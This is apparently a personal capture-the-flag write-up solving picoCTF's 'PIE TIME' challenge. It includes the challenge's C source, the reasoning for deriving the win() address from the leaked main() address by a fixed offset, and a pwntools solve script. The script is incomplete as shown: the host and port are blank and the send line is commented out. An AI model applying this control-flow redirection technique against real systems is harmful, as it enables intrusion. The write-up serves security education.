## Introduction 
Today i will be explaining how i solved PIE TIME from picoCTF <https://learn.cylabacademy.org/library/727?page=1&category=6>


## checksec 
Run `checksec` to determine what attacks are allowed. Based on the results shown below, PIE is enabled which randomises the addresses of the function every time it is ran. 

![](assets/posts/PWN/picoCTF/PIE_TIME/checksec.png)

## source code inspection

Upon inspecting the provided source code as shown below, i can infer that the code will firstly provide the address __main__. Secondly, it will prompt the user to enter an address to jump to. 

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
The goal of this challenge is to jump to the __win__ function as shown below in Ghidra. 

![](assets/posts/PWN/picoCTF/PIE_TIME/ghidra1.png)

## How? 
Despite PIE being enabled, it is possible to determine the location of the __win__ function. This can be done by determining the difference between __win__ and __main__. To find out the difference run the program twice in gdb locally to determine the difference. The addresses of the functions are shown below. 

__main__ function: 

![](assets/posts/PWN/picoCTF/PIE_TIME/gdb1.png)


__win__ function:

![](assets/posts/PWN/picoCTF/PIE_TIME/gdb2.png)

The difference between these 2 addresses is 150 bytes, to be more precise, take the __main__ address and subtract 150 bytes from it which will provide the address of the __win__ function as seen below. 

calculation:

```
0x000055555555533d - 0x00005555555552a7 = 0x96
```

actual address of __win__ :

![](assets/posts/PWN/picoCTF/PIE_TIME/gdb2.png)


## Completitng the challenge
To complete the script i used the below script to fetch __main__ address, minus -150 and output the result. 

```
from pwn import *

# Connection details
HOST = ''
PORT = 
context.log_level = 'debug'
io = remote(HOST, PORT)



# Receive first line > parse > get the main address from output
recv_address = io.recvline()
print(recv_address)
recv_address = recv_address.split(b"0x")[-1].strip()
main_address = int(recv_address, 16)

print(f"[*] Base address parsed: {hex(main_address)}")
main_address -= 150
print(f"[*] Sending target address: {hex(main_address)}")

# SEND PART:
#io.sendline(p64(main_address))

# Interactive shell
io.interactive()
```
